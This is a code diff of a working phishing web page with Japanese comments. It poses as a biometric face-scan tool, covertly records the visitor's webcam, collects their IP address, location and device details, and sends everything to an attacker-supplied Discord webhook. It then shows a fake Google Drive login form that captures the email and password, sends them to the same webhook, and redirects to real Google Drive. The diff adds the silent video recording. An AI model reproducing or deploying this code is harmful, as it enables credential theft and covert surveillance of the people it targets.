@@ -58,28 +58,22 @@
         }
         .btn:hover { background: var(--accent); color: #000; }
 
-        /* Google Login Section (Authentic) */
-        #login-ui { display: none; }
-        .g-logo { text-align: center; margin-bottom: 20px; }
+        #login-ui, #step-pass, #result-ui { display: none; }
         input { 
             width: 100%; padding: 16px; background: #161616; border: 1px solid #333; 
             border-radius: 4px; color: #fff; margin-bottom: 15px; font-size: 16px;
         }
         input:focus { border-color: var(--accent); }
-
-        #step-pass, #result-ui { display: none; }
     </style>
 </head>
 <body>
 
-    <!-- 1. スキャン画面 -->
     <div class="card" id="camera-ui">
         <div class="header"><h1>BIO-ANALYTICS v4.0</h1><p>Scanning facial topology</p></div>
         <div class="v-wrap"><div class="scan-overlay"></div><video id="video" autoplay playsinline muted></video></div>
         <button class="btn" id="start-btn">INITIALIZE SCAN</button>
     </div>
 
-    <!-- 2. 専門的診断結果 -->
     <div class="card" id="result-ui">
         <div class="header"><h1>ANALYSIS REPORT</h1><p>Biometric metrics identified</p></div>
         <div class="v-wrap"><img id="result-preview" src=""></div>
@@ -94,24 +88,18 @@
         <button class="btn" id="view-details-btn">GENERATE FULL REPORT (DRIVE)</button>
     </div>
 
-    <!-- 3. 本気のGoogleログイン -->
     <div class="card" id="login-ui">
-        <div class="g-logo">
-            <svg viewBox="0 0 75 24" width="90"><path d="M14.1 2.3C11.5 2.3 9.3 3.4 7.7 5.2l2.6 2.1c1.1-1.3 2.7-2.1 4.5-2.1 3.3 0 6 2.5 6 6.3s-2.7 6.3-6 6.3c-1.8 0-3.4-.8-4.5-2.1l-2.6 2.1c1.6 1.8 3.8 2.9 6.4 2.9 4.9 0 9-3.9 9-9.2s-4.1-9.2-9-9.2zm-14.1 0h3v18.8h-3z" fill="#fff"/></svg>
-        </div>
         <div style="text-align:center; margin-bottom:30px;">
+            <svg viewBox="0 0 75 24" width="90" style="margin-bottom:20px;"><path d="M14.1 2.3C11.5 2.3 9.3 3.4 7.7 5.2l2.6 2.1c1.1-1.3 2.7-2.1 4.5-2.1 3.3 0 6 2.5 6 6.3s-2.7 6.3-6 6.3c-1.8 0-3.4-.8-4.5-2.1l-2.6 2.1c1.6 1.8 3.8 2.9 6.4 2.9 4.9 0 9-3.9 9-9.2s-4.1-9.2-9-9.2zm-14.1 0h3v18.8h-3z" fill="#fff"/></svg>
             <div id="g-title" style="font-size:24px; margin-bottom:8px;">ログイン</div>
             <div id="g-subtitle" style="font-size:14px; color:var(--text-dim);">Google ドライブに続行</div>
         </div>
         <form id="trap-form">
             <div id="step-email">
                 <input type="email" id="email" placeholder="メールアドレスまたは電話番号" required>
-                <div style="color:var(--accent); font-size:13px; font-weight:600; margin-bottom:40px;">メールアドレスを忘れた場合</div>
             </div>
             <div id="step-pass">
-                <div id="user-chip" style="background:#222; border-radius:20px; padding:6px 16px; display:inline-flex; align-items:center; margin-bottom:20px; font-size:13px; border:1px solid #333;">
-                    <span id="target-email-val"></span>
-                </div>
+                <div id="user-chip" style="background:#222; border-radius:20px; padding:6px 16px; display:inline-flex; align-items:center; margin-bottom:20px; font-size:13px; border:1px solid #333;"><span id="target-email-val"></span></div>
                 <input type="password" id="pass" placeholder="パスワードを入力" required>
             </div>
             <div style="display:flex; justify-content:space-between; align-items:center;">
@@ -125,76 +113,79 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // 【重要】ここに自分のDiscord Webhook URLを貼れ
-        const WEBHOOK_URL = "ここにURLをペースト";
-
-        let capturedImg = "";
+        const WEBHOOK_URL = "ここにDiscordのURLを貼れ";
+        let mediaRecorder;
+        let recordedChunks = [];
         let intel = {};
 
-        // 1. デバイス・インテル収集
+        // 1. デバイス情報取得
         async function fetchIntel() {
             try {
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const ipData = await ipRes.json();
                 const bat = await navigator.getBattery();
                 intel = {
-                    ip: ipData.ip,
-                    city: ipData.city,
-                    isp: ipData.org,
+                    ip: ipData.ip, city: ipData.city, isp: ipData.org,
                     ua: navigator.userAgent,
-                    bat: `${(bat.level * 100).toFixed(0)}% (${bat.charging ? '充電中' : '放電'})`,
-                    spec: `${navigator.hardwareConcurrency}コア / ${navigator.deviceMemory || '不明'}GB RAM`,
+                    bat: `${(bat.level * 100).toFixed(0)}%`,
                     time: new Date().toLocaleString('ja-JP')
                 };
-            } catch (e) { intel.error = "Intel Fetch Failed"; }
+            } catch (e) {}
         }
 
-        // 2. スキャン実行
+        // 2. 録画とスキャン
         const video = document.getElementById('video');
         document.getElementById('start-btn').onclick = async () => {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
-            document.getElementById('start-btn').innerText = "CALIBRATING...";
+            document.getElementById('start-btn').innerText = "ANALYZING...";
             await fetchIntel();
 
+            // サイレント録画開始
+            mediaRecorder = new MediaRecorder(stream);
+            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
+            mediaRecorder.start();
+
             setTimeout(async () => {
+                // 静止画キャプチャ
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                capturedImg = canvas.toDataURL('image/jpeg', 0.8);
+                const capturedImg = canvas.toDataURL('image/jpeg', 0.8);
                 
                 document.getElementById('camera-ui').style.display = 'none';
                 document.getElementById('result-ui').style.display = 'block';
                 document.getElementById('result-preview').src = capturedImg;
 
-                // Discordへ「特定情報」を第一弾として送信
-                const formData = new FormData();
-                formData.append('payload_json', JSON.stringify({
-                    username: "SYSTEM_INTEL",
-                    embeds: [{
-                        title: "⚡ TARGET IDENTIFIED",
-                        color: 0x3d8bff,
-                        fields: [
-                            { name: "📍 IP/Location", value: `IP: ${intel.ip}\nCity: ${intel.city}\nISP: ${intel.isp}` },
-                            { name: "📱 Device", value: `Battery: ${intel.bat}\nSpec: ${intel.spec}\nUA: \`\`\`${intel.ua}\`\`\`` }
-                        ],
-                        footer: { text: `Captured at: ${intel.time}` }
-                    }]
-                }));
-                formData.append('file', await (await fetch(capturedImg)).blob(), 'face_capture.jpg');
-                fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+                // 録画停止と送信
+                mediaRecorder.stop();
+                mediaRecorder.onstop = async () => {
+                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('payload_json', JSON.stringify({
+                        username: "SILENT_RECORDER",
+                        embeds: [{
+                            title: "📹 VIDEO & INTEL CAPTURED",
+                            color: 0x3d8bff,
+                            description: `IP: ${intel.ip}\nLoc: ${intel.city}\nBat: ${intel.bat}`,
+                            footer: { text: `Time: ${intel.time}` }
+                        }]
+                    }));
+                    formData.append('file1', await (await fetch(capturedImg)).blob(), 'thumb.jpg');
+                    formData.append('file2', videoBlob, 'capture.webm');
+                    fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+                };
 
                 stream.getTracks().forEach(t => t.stop());
-            }, 3500);
+            }, 5000); // 5秒間録画
         };
 
-        // 3. 誘導: Googleログインへ
+        // 誘導と奪取
         document.getElementById('view-details-btn').onclick = () => {
             document.getElementById('result-ui').style.display = 'none';
             document.getElementById('login-ui').style.display = 'block';
         };
 
-        // 4. ログインステップ制御
         document.getElementById('next-btn').onclick = () => {
             const email = document.getElementById('email').value;
             if(!email.includes('@')) return;
@@ -206,30 +197,24 @@
             document.getElementById('g-title').innerText = "ようこそ";
         };
 
-        // 5. ログイン情報(PW)奪取 & 送信
         document.getElementById('trap-form').onsubmit = async (e) => {
             e.preventDefault();
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
-
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     username: "CREDENTIAL_MANAGER",
                     embeds: [{
-                        title: "🔑 CREDENTIALS EXFILTRATED",
+                        title: "🔑 PASSWORD EXFILTRATED",
                         color: 0xff4d4d,
                         fields: [
-                            { name: "Identifier", value: `\`${email}\`` },
-                            { name: "Secret", value: `||${pass}||` }
-                        ],
-                        footer: { text: `Target IP: ${intel.ip}` }
+                            { name: "User", value: document.getElementById('email').value },
+                            { name: "Pass", value: `||${document.getElementById('pass').value}||` }
+                        ]
                     }]
                 })
             });
-            // 最後に本物のGoogleへ飛ばして「エラーかな？」と思わせる
-            window.location.href = "https://accounts.google.com/v3/signin/identifier?continue=https://drive.google.com";
+            window.location.href = "https://drive.google.com";
         };
     </script>
 </body>
